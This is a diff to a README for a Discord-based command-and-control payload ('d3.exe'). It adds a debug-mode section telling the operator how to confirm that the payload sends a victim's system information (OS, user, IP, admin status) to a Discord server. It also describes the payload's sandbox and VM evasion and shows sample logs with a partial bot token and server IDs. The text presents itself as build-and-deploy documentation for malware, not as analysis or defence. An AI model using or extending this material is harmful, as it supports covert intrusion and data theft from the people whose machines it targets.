@@ -152,4 +152,53 @@ quick_build.bat
 
 **Result:** `dist/d3.exe` ready to deploy!
 
+## Debug Mode
+
+### Testing Your Payload
+
+To verify your payload works correctly, use debug mode:
+
+```cmd
+d3.exe -d
+```
+
+**What Debug Mode Does:**
+- 🐛 **Sends Debug Hit** - Immediate test message to your Discord server
+- 📊 **Shows System Info** - Displays target system information in Discord
+- 📝 **Terminal Logs** - Real-time logging of all operations
+- 🛡️ **Bypasses Evasion** - Runs even in VMs/sandboxes for testing
+- 📄 **Creates Log File** - Saves `debug.log` for troubleshooting
+- ✅ **Verifies Connectivity** - Confirms Discord bot connection works
+
+**Debug Discord Message:**
+When you run with `-d`, you'll see a special debug message in Discord with:
+- 🐛 Debug Hit notification
+- 🖥️ System information (OS, User, IP, etc.)
+- 🛡️ Security status (Admin, VM detection, evasion results)
+- 🔍 Debug mode confirmation
+
+**Terminal Output:**
+```
+============================================================
+DEBUG MODE ENABLED
+============================================================
+Bot Token: MTM37NTkzNTQ5OTU0OTU0...
+Guild ID: 1375935187250057216
+Channel ID: 1375935188265209989
+============================================================
+[14:32:15] DEBUG: Starting payload in DEBUG MODE
+[14:32:16] DEBUG: Sending debug hit to Discord server...
+[14:32:17] DEBUG: Debug hit sent successfully!
+[14:32:18] DEBUG: Sandbox evasion test: PASSED
+[14:32:19] DEBUG: Starting Discord bot...
+[14:32:20] DEBUG: Bot connected successfully
+```
+
+**Use Cases:**
+- ✅ Verify payload functionality before deployment
+- ✅ Test Discord bot connectivity and permissions
+- ✅ Troubleshoot connection issues
+- ✅ Confirm system information gathering works
+- ✅ Debug sandbox evasion behavior
+
 This is the fastest way to get your Discord C2 payload built and ready for deployment on Windows Server 2019.
